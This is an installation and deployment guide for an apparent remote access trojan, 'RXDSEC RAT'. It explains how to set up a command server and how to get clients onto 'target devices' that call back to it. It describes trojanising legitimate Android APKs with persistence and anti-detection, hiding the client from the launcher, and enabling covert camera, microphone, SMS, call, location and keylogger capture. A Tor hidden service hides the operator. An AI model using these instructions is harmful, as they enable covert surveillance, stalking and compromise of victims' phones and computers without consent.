# RXDSEC RAT Installation Guide

This document provides detailed installation instructions for setting up both the server and client components of RXDSEC RAT.

## Table of Contents
- [Server Installation](#server-installation)
  - [System Requirements](#server-system-requirements)
  - [Basic Installation](#basic-installation)
  - [Database Configuration](#database-configuration)
  - [Advanced Configuration](#advanced-configuration)
  - [Security Hardening](#security-hardening)
  - [Troubleshooting](#server-troubleshooting)
- [Client Installation](#client-installation)
  - [Android Installation](#android-installation)
  - [Cross-Platform Installation](#cross-platform-installation)
  - [APK Binding Process](#apk-binding-process)
  - [Client Configuration](#client-configuration)
  - [Troubleshooting](#client-troubleshooting)
- [Deployment Options](#deployment-options)
  - [Local Network Deployment](#local-network-deployment)
  - [Cloud Deployment](#cloud-deployment)
  - [Tor Hidden Service](#tor-hidden-service)

## Server Installation

### Server System Requirements

#### Minimum Requirements
- Python 3.11 or higher
- 1GB RAM
- 500MB disk space
- Network connectivity

#### Recommended Requirements
- Python 3.11 or higher
- 2GB+ RAM
- 1GB+ disk space
- PostgreSQL database server
- HTTPS capability (certificate)
- Stable network connection

### Basic Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/rxdsec/rxdsec-rat.git
   cd rxdsec-rat
   ```

2. **Create a virtual environment (optional but recommended):**
   ```bash
   python -m venv venv
   
   # On Windows
   venv\Scripts\activate
   
   # On Linux/macOS
   source venv/bin/activate
   ```

3. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

4. **Set up environment variables:**
   Create a `.env` file in the project root with the following variables:
   ```
   SESSION_SECRET=your_secure_random_string
   DATABASE_URL=sqlite:///data/rxdsec.db
   DEBUG=False
   ```

5. **Initialize the database:**
   ```bash
   python init_db.py
   ```

6. **Start the server:**
   ```bash
   # Development mode
   python main.py
   
   # Production mode
   gunicorn --bind 0.0.0.0:5000 --workers 4 main:app
   ```

7. **Access the web interface:**
   Open your browser and navigate to `http://localhost:5000`
   
   Default credentials:
   - Username: `admin`
   - Password: `adminpassword`
   
   **IMPORTANT:** Change the default password immediately after first login!

### Database Configuration

#### SQLite (Default)
SQLite is used by default and requires no additional configuration. Data is stored in `data/rxdsec.db`.

#### PostgreSQL (Recommended for Production)
For better performance and reliability, PostgreSQL is recommended:

1. **Install PostgreSQL** on your system or use a cloud-hosted instance

2. **Create a database and user:**
   ```sql
   CREATE DATABASE rxdsec;
   CREATE USER rxdsec_user WITH ENCRYPTED PASSWORD 'your_secure_password';
   GRANT ALL PRIVILEGES ON DATABASE rxdsec TO rxdsec_user;
   ```

3. **Update your `.env` file:**
   ```
   DATABASE_URL=postgresql://rxdsec_user:your_secure_password@localhost/rxdsec
   ```

4. **Re-initialize the database:**
   ```bash
   python init_db.py
   ```

### Advanced Configuration

#### HTTPS Setup
For production deployments, HTTPS is strongly recommended:

1. **Obtain an SSL certificate** (Let's Encrypt or a commercial provider)

2. **Configure with Gunicorn and Nginx:**
   Sample Nginx configuration:
   ```nginx
   server {
       listen 443 ssl;
       server_name your-domain.com;
       
       ssl_certificate /path/to/cert.pem;
       ssl_certificate_key /path/to/key.pem;
       
       location / {
           proxy_pass http://127.0.0.1:5000;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
       }
   }
   ```

3. **Start Gunicorn behind Nginx:**
   ```bash
   gunicorn --bind 127.0.0.1:5000 --workers 4 main:app
   ```

#### Custom Port Configuration
To run the server on a different port, modify the `main.py` file or use the Gunicorn command:
```bash
gunicorn --bind 0.0.0.0:8080 --workers 4 main:app
```

### Security Hardening

1. **Change default credentials** immediately after installation

2. **Use strong, unique passwords** for admin accounts

3. **Enable HTTPS** as described in the Advanced Configuration section

4. **Restrict access** to the server using a firewall:
   ```bash
   # UFW example (Ubuntu)
   sudo ufw allow 443/tcp
   sudo ufw deny 5000/tcp  # If using Nginx as proxy
   ```

5. **Regularly update** the application and dependencies

### Server Troubleshooting

#### Database Connection Issues
- Verify your database connection string in `.env`
- Ensure the database server is running
- Check if the database user has proper permissions

#### Server Won't Start
- Verify Python version (3.11+)
- Check for port conflicts with `netstat -tuln`
- Examine error logs in the console output

#### Authentication Problems
- Reset admin password using the database:
   ```sql
   UPDATE user SET password_hash='new_hashed_password' WHERE username='admin';
   ```
   (Use `werkzeug.security.generate_password_hash()` to generate the hash)

## Client Installation

### Android Installation

#### Method 1: Direct Installation via Termux

1. **Install Termux** from F-Droid or Google Play Store

2. **Open Termux** and run the following commands:
   ```bash
   pkg update
   pkg install python
   pip install requests cryptography
   ```

3. **Download the client script:**
   ```bash
   curl -o android_client.py http://your-server:5000/download_client
   ```

4. **Run the client:**
   ```bash
   python android_client.py --server http://your-server:5000 --secure
   ```

5. **Optional arguments:**
   - `--hide`: Attempts to hide the process
   - `--secure`: Enables encryption

#### Method 2: APK Installation

1. Access the **APK Binding** feature from the control panel
2. Upload a legitimate APK file
3. Configure payload options (persistence, anti-detection, etc.)
4. Download the bound APK
5. Transfer to target device and install

### Cross-Platform Installation

#### Windows

1. **Install Python 3.11+** from python.org

2. **Install the required packages:**
   ```cmd
   pip install requests cryptography pywin32
   ```

3. **Download the client script** from the server

4. **Run the client:**
   ```cmd
   python android_client.py --server http://your-server:5000
   ```

#### Linux

1. **Install dependencies:**
   ```bash
   sudo apt update
   sudo apt install python3 python3-pip
   pip3 install requests cryptography
   ```

2. **Download and run the client:**
   ```bash
   python3 android_client.py --server http://your-server:5000
   ```

#### macOS

1. **Install Python** using Homebrew or from python.org
   ```bash
   brew install python
   ```

2. **Install dependencies:**
   ```bash
   pip3 install requests cryptography
   ```

3. **Run the client:**
   ```bash
   python3 android_client.py --server http://your-server:5000
   ```

### APK Binding Process

The APK binding process injects the RXDSEC RAT payload into a legitimate APK:

1. **Select a legitimate APK** (target application)

2. **Upload to the server** using the APK Binding page

3. **Configure payload options:**
   - Persistence method
   - Anti-detection features
   - Surveillance capabilities

4. **Generate the bound APK**
   The server will:
   - Decompile the APK
   - Inject the payload
   - Modify the manifest
   - Recompile and sign the APK

5. **Install on target device**
   - Enable "Install from unknown sources" if needed
   - Install the modified APK

### Client Configuration

#### Essential Command-Line Arguments

| Argument | Description |
|----------|-------------|
| `--server URL` | Server address (required) |
| `--hide` | Attempt to hide from launcher/recents |
| `--secure` | Enable encryption |
| `--interval N` | Set heartbeat interval in seconds |
| `--persist` | Enable persistence across reboots |

#### Configuration File
For more complex configurations, create a `config.json` file in the same directory:

```json
{
  "server_url": "http://your-server:5000",
  "encryption_enabled": true,
  "heartbeat_interval": 30,
  "hide_app": true,
  "persist": true,
  "anti_emulator": true,
  "surveillance": {
    "camera": true,
    "microphone": true,
    "location": true,
    "sms": true,
    "calls": true,
    "contacts": true,
    "keylogger": false
  }
}
```

### Client Troubleshooting

#### Connection Issues
- Verify the server URL is correct and accessible
- Check network connectivity on both server and client
- Ensure proper port forwarding if server is behind NAT

#### Permissions Problems on Android
- Verify all required permissions are granted
- For advanced features, ensure the device is rooted
- Some features may require additional configuration on newer Android versions

#### Client Visibility Issues
- If client appears in launcher despite `--hide` flag, check device compatibility
- Some features may require root access to function properly

## Deployment Options

### Local Network Deployment

For testing or home/office monitoring:

1. **Run the server** on a computer within your network
2. **Configure port forwarding** on your router (port 5000 by default)
3. **Connect clients** using your public IP or local network IP

### Cloud Deployment

For better accessibility and uptime:

1. **Set up a VPS** (AWS, DigitalOcean, Linode, etc.)
2. **Install and configure** the server as described above
3. **Configure domain and SSL** for secure access
4. **Implement proper security measures** (firewall, fail2ban, etc.)

### Tor Hidden Service

For enhanced anonymity (advanced users only):

1. **Install Tor** on your server:
   ```bash
   sudo apt install tor
   ```

2. **Configure a hidden service** by editing `/etc/tor/torrc`:
   ```
   HiddenServiceDir /var/lib/tor/hidden_service/
   HiddenServicePort 80 127.0.0.1:5000
   ```

3. **Restart Tor**:
   ```bash
   sudo systemctl restart tor
   ```

4. **Get your .onion address**:
   ```bash
   sudo cat /var/lib/tor/hidden_service/hostname
   ```

5. **Connect clients** using the .onion address through Tor